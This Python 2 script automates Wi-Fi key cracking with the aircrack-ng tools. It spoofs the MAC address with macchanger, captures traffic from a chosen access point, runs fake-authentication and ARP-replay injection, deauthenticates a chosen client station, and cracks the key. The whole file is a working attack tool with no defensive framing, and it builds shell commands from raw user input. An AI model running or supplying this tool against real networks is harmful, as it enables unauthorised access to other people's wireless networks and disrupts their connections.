#!/usr/bin/python

import os
import time
import pussylib



def init(): 
	initlist= ';'.join(("airmon-ng stop mon4",
                "airmon-ng stop mon3",
                "airmon-ng stop mon2",
                "airmon-ng stop mon1",
                "airmon-ng stop mon0",
                "airmon-ng stop wlan0",
		"ifconfig wlan0 down",
		"airmon-ng start wlan0",
		"airmon-ng start wlan0",
		"ifconfig mon0 down",
		"ifconfig mon1 down",
		"macchanger -r mon0",
		"macchanger -r mon1",
		"ifconfig wlan0 up",
		"ifconfig mon0 up",
		"ifconfig mon1 up"))
	os.system(initlist)


def housekeeping():
	#back to normal
	houselist= ';'.join(("airmon-ng stop mon4",
		"airmon-ng stop mon3",
		"airmon-ng stop mon2",
		"airmon-ng stop mon1",
		"airmon-ng stop mon0",
		"airmon-ng stop wlan0",
		"service network-manager start",))
	os.system(houselist)
	os.sys.exit()

def scan():
	os.system("airodump-ng mon1")

def listen():
	os.system("gnome-terminal -x airodump-ng -c "+channel+" --bssid "+bssid+" -w box/"+essid+" mon1 &")

def fakeauth():
	fauth_success = "n"
        while (fauth_success == "n"):
		os.system("aireplay-ng -1 0 -e "+essid+" -a "+bssid+" -h "+station+" mon0") 
		fauth_success = raw_input("Fake-auth success?: ")

def deauth():
	os.system("gnome-terminal -x aireplay-ng -3 -b "+bssid+" -h "+station+" mon0 &")

def deauthsome1():
	os.system("gnome-terminal -x aireplay-ng -0 900 -b "+bssid+" -c "+target_station+" mon0 &")


def aircrack():
	os.system("aircrack-ng -z -b "+bssid+" box/"+essid+"*.cap &")

def aircracktest():
        os.system("gnome-terminal -x aircrack-ng -z -b "+bssid+" box/"+essid+"*.cap &")


#=========================qr=============================D


init()
scan()

# input target prefs
bssid = raw_input("bssid: ")
essid = raw_input("essid: ")
channel = raw_input("channel: ")
macshow = os.popen("macchanger -s mon0")
station = macshow.read()[13:30]

# starts listening for ivs
listen()

cont = "n"
while (cont == "n"): 
	listen_selection = raw_input("\n 0 Change Target\n 1 Fake-auth(FAST)\n 2 De-auth\n 3 Aircrack\n 4 Aircrack(test)\n 5 Quit\n\nplease pick a number: ")
	if listen_selection == "1":
		fakeauth()
	elif listen_selection == "2":
		deauth()
	elif listen_selection == "3":
		aircrack()
	elif listen_selection == "5":
		housekeeping()
	elif listen_selection == "0":
		scan()
		# input target prefs
		bssid = raw_input("bssid: ")
		essid = raw_input("essid: ")
		channel = raw_input("channel: ")
		macshow = os.popen("macchanger -s mon0")
		station = macshow.read()[13:30]
	elif listen_selection == "4":
		aircracktest()
	elif listen_selection == "6":
		target_station = raw_input("Input station target: ")
		deauthsome1()		
	elif listen_selection == "qr":
		print "Oh god dammit fuck you"
		housekeeping()
	else:
	     print ">:("
	
print "I'm out biatch"
